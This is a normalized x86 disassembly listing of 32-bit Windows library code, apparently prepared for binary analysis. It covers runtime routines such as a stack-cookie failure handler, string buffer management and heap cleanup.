cmp edi [ ebx + 0xc8 ]
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ edi ]
call sub_10061970
push 0xffffffff
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_1000c1e0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
sub_10016580
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x3
cmp eax 0x1ffffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x3
cmp eax edx
jbe r-xdata
push r--data
call sub_100616c6
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x1fffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_10016260
mov edx eax
cmp edx eax
jae r-xdata
sub_100165d0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi + 0x34 ] 0x10
lea eax [ edi + 0x20 ]
jb r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x14 ]
push ecx
push eax
lea edx [ esi + 0x122 ]
call sub_1001d2c0
mov edx [ esi + 0x14 ]
add esp 0x8
mov [ edi + 0x380 ] edx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ eax ]
sub_1001660b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1001c548
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_10016638
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1000818a
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1000818a
pop ecx
sub_1001673e
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_100167a4
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1002657b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10016841
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1001c548
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_10016870
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f5f7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
mov esi [ LocalFree@IAT ]
mov [ ebx ] edi
cmp eax edi
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax edi
je r-xdata
push eax
call esi
mov eax [ ebx + 0x14 ]
dec eax
mov [ ebx + 0x8 ] edi
cmp eax 0x5
ja r-xdata
push eax
call esi
mov [ ebx + 0x14 ] edi
mov [ ebp - 0x4 ] 0x3
mov eax [ ebx + 0x3c ]
dec [ eax ]
mov eax [ eax ]
cmp eax edi
jne r-xdata
jmp [ eax * 4 + jump_table_10016ac8 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx + 0x34 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x38 ]
cmp ecx edi
je r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10027500
mov eax esi
push eax
lea edi [ ebx + 0x18 ]
mov [ ebp - 0x4 ] 0x5
call sub_10026770
mov edi esi
mov [ ebp - 0x4 ] 0x4
call sub_10065690
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10027500
lea edi [ ebx + 0x20 ]
mov ebx esi
call sub_1005ac40
mov edi esi
call sub_10014890
mov ebx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10027500
lea esi [ ebx + 0x28 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x6
call sub_10002d90
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_10010040
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10027500
lea esi [ ebx + 0x30 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x7
call sub_10002d90
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_10010040
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10027500
lea esi [ ebx + 0x38 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x8
call sub_10002d90
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_10010040
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x2c ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x3c ]
mov [ ebx + 0x38 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edi edi
mov eax [ ebx + 0x24 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x28 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x34 ]
mov [ ebx + 0x30 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x3c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x1c ]
dec [ eax ]
jne r-xdata
mov esi [ ebx + 0x20 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ ebx + 0x28 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x34 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebx + 0x18 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x20 ] edi
cmp eax edi
je r-xdata
call sub_10020880
mov [ ebx + 0x2c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x18 ] edi
cmp eax edi
je r-xdata
mov eax esi
call sub_10054700
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x24 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x1c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10016ae0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_100616c6
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_1004d5e0
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_10065045
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_10078600
add esp 0xc
sub_10016b90
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10016be1
push 0x4
mov eax sub_1007e209
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100067d1
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_1001f981
push esi
call sub_10065045
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_1002470e
call sub_1001a1b3
retn
sub_10016c2f
push 0x4
mov eax sub_1007ecfc
call sub_10050d0f
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_100106db
mov eax esi
call sub_1001a1b3
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_1000b535
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_100106db
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_10016cbe
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10054678
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_10012991
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_100159e2
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1000a03a
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10016dd4
push 0x58
mov eax sub_1007e8eb
call sub_10007703
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10009450
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10064bde
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_1002a730
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx ebx [ ebp + 0x1c ]
mov edx [ ecx ]
push ebx
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ edx + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10020962
mov [ ebp - 0x4 ] 0x3
call sub_10039e87
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_10019c00
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_10051390
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10024aa0
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x54 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1004c5ab
mov ecx [ eax ]
push edi
push [ ebp - 0x54 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_10017235
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10024aa0
mov eax [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10016f40
push ebp
mov ebp esp
push 0xffffffff
push sub_1008106c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
call sub_10037100
mov edi [ esi + 0x4 ]
cmp edi [ esi + 0x8 ]
je r-xdata
xor ebx ebx
mov ecx [ edi ]
xor ebx ebx
cmp ecx ebx
je r-xdata
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
cmp [ esi + 0x44 ] 0x8
jb r-xdata
push eax
call sub_10065045
add esp 0x4
add edi 0x4
cmp edi [ esi + 0x8 ]
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x1
call edx
xor edx edx
mov [ esi + 0x44 ] 0x7
mov [ esi + 0x40 ] ebx
mov [ esi + 0x30 ] dx
mov edi [ esi + 0x18 ]
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
push ecx
call sub_10065045
add esp 0x4
jmp r-xdata
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ebx [ esi + 0x1c ]
cmp edi ebx
je r-xdata
lea eax [ esi + 0x4c ]
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ esi + 0x64 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10065045
add esp 0x4
mov edx [ esi + 0x18 ]
push edx
call sub_10065045
add esp 0x4
xor ebx ebx
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
add edi 0x24
cmp edi ebx
jne r-xdata
mov eax [ edi ]
push eax
call sub_10065045
add esp 0x4
sub_10017062
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sub edi [ ebp + 0x8 ]
sar esi 0x1
sar edi 0x1
or ebx 0xffffffff
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_100539e5
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
call sub_10028397
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi edi
ja r-xdata
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
push edi
push eax
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0xc ]
call sub_100471a2
mov ebx eax
xor eax eax
add esp 0x18
cmp ebx eax
jne r-xdata
mov ebx esi
jmp r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10078600
add esp 0xc
jbe r-xdata
push eax
push eax
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
call sub_100471a2
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
call sub_10020a90
pop ecx
mov ecx [ ebp + 0x14 ]
movzx ecx [ eax + ecx ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 2 ] cx
inc eax
cmp eax ebx
jb r-xdata
mov ebx 0x7fffffff
jmp r-xdata
sub_10017130
cmp [ edx + 0xd6 ] 0x0
je r-xdata
mov eax [ edx + 0xd8 ]
mov eax [ edx + 0xdc ]
jmp r-xdata
mov eax 0x1f4
retn
sub eax ecx
retn
mov ecx [ edx + 0x108 ]
add ecx [ edx + 0x100 ]
mov edx [ edx + 0x50 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + edx + 0x4f ]
cmp eax ecx
jbe r-xdata
sub_1001716a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10017bc2
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
sub_10017235
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1002836c
dec [ ebp + 0x1c ]
jne r-xdata
sub_10017260
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
call sub_10054678
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x8
push eax
call sub_1000906c
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add esi 0x2
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_10038120
fld [ eax + 0x10 ]
add esp 0xc
cmp [ ebp - 0x20 ] 0x0
je r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100172f0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
sub_10017366
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ ebp + 0x10 ]
mov [ ecx ] 0x2a2e
add ecx 0x2
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_100173d0
push ebx
mov ebx [ esi + 0x4 ]
push edi
xor edi edi
test ebx ebx
je r-xdata
mov eax [ esi ]
pop edi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov eax [ esi ]
cmp [ eax + edi * 4 ] 0x0
lea eax [ eax + edi * 4 ]
je r-xdata
dec [ esi + 0x4 ]
inc edi
cmp edi ebx
jb r-xdata
mov ecx [ eax ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ esi ]
mov [ edx + edi * 4 ] 0x0
sub_1001742d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
pop ebp
retn
sub_10017480
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
push edi
xor edi edi
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] edi
call sub_10061250
mov [ ebp - 0x50 ] eax
cmp eax edi
je r-xdata
push 0x4
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
lea eax [ edi + 0x4 ]
call sub_1000a6f0
mov esi [ ebp - 0x4c ]
cmp esi edi
je r-xdata
inc [ edi ]
lea eax [ ebp - 0x5c ]
cmp ebx eax
je r-xdata
mov [ eax ] edi
mov edi eax
mov esi [ ebp - 0x54 ]
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x50 ]
pop edi
mov [ esi ] 0x0
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
call sub_10020880
jmp r-xdata
mov esi [ ebp - 0x4c ]
mov eax [ ebx + 0x4 ]
dec [ eax ]
jne r-xdata
test esi esi
je r-xdata
mov esi [ ebp - 0x4c ]
mov [ ebx ] esi
mov [ ebx + 0x4 ] edi
inc [ edi ]
jmp r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_10020880
dec [ edi ]
jne r-xdata
mov eax [ ebx + 0x4 ]
